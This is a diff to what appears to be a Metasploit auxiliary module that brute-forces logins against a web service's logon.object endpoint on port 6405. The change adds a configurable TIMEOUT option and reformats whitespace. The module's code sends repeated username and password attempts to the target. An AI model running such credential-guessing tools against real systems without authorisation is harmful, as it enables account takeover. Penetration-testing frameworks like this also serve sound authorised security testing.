@@ -30,17 +30,22 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(6405),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
     register_autofilter_ports([ 6405 ])
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
     res = send_request_cgi({
       'uri'	 => "/PlatformServices/service/app/logon.object",
-      'method'  => 'GET'
-    }, 25)
-    return if not res
+      'method'   => 'GET'
+    }, timeout)
 
+    return if not res
     each_user_pass { |user, pass|
       enum_user(user,pass)
     }
@@ -55,15 +60,15 @@ class Metasploit3 < Msf::Auxiliary
     data << '&authType=secEnterprise&backUrl=%2FApp%2Fhome.faces'
     begin
       res = send_request_cgi({
-        'uri'		  => '/PlatformServices/service/app/logon.object',
-        'data'		 => data,
-        'method'	   => 'POST',
-        'headers'	  =>
+        'uri'	     => '/PlatformServices/service/app/logon.object',
+        'data'       => data,
+        'method'     => 'POST',
+        'headers'    =>
               {
-                'Connection' => "keep-alive",
+                'Connection'      => "keep-alive",
                 'Accept-Encoding' => "gzip,deflate",
               },
-      }, 45)
+      }, timeout)
       return :abort if (!res or (res and res.code != 200))
       if(res.body.match(/Account Information/i))
         success = false
